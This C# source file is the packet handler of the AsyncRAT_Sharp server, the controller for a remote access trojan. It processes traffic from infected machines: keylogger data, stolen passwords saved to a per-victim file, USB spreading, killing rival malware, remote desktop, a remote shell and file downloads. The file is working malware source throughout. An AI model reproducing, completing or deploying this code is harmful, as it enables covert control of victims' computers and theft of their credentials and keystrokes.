using AsyncRAT_Sharp.Sockets;
using AsyncRAT_Sharp.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using AsyncRAT_Sharp.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Handle_Packet
{
    public static class Packet
    {
        public static void Read(object Obj)
        {
            Clients client = null;
            try
            {
                object[] array = Obj as object[];
                byte[] data = (byte[])array[0];
                client = (Clients)array[1];
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        {
                            new HandleListView().AddToListview(client, unpack_msgpack);
                            break;
                        }

                    case "Ping":
                        {
                            new HandlePing(client, unpack_msgpack);
                            break;
                        }

                    case "Logs":
                        {
                            new HandleLogs().Addmsg(unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
                            break;
                        }

                    case "thumbnails":
                        {
                            new HandleThumbnails(client, unpack_msgpack);
                            break;
                        }

                    case "BotKiller":
                        {
                            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                            break;
                        }

                    case "usbSpread":
                        {
                            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                            break;
                        }

                    case "recoveryPassword":
                        {
                            string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
                            if (!Directory.Exists(fullPath))
                                Directory.CreateDirectory(fullPath);
                            File.WriteAllText(fullPath + "\\Passowrds.txt", unpack_msgpack.ForcePathObject("Password").AsString);
                            if (File.ReadAllText(fullPath + "\\Passowrds.txt").Length > 23)
                            {
                                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
                            }
                            break;
                        }

                    case "Received":
                        {
                            new HandleListView().Received(client);
                            break;
                        }

                    case "remoteDesktop":
                        {
                            new HandleRemoteDesktop().Capture(client, unpack_msgpack);
                            break;
                        }

                    case "processManager":
                        {
                            new HandleProcessManager().GetProcess(client, unpack_msgpack);
                            break;
                        }


                    case "socketDownload":
                        {
                            new HandleFileManager().SocketDownload(client, unpack_msgpack);
                            break;
                        }

                    case "keyLogger":
                        {
                            new HandleKeylogger(client, unpack_msgpack);
                            break;
                        }

                    case "fileManager":
                        {
                            new HandleFileManager().FileManager(client, unpack_msgpack);
                            break;
                        }

                    case "shell":
                        {
                            new HandleShell(unpack_msgpack, client);
                            break;
                        }

                    case "chat":
                        {
                            new HandleChat(unpack_msgpack, client);
                            break;
                        }
                }
            }
            catch (CryptographicException)
            {
                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password", Color.Red);
                //  Settings.Blocked.Add(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                client.Disconnected();
                return;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                return;
            }
        }
    }
}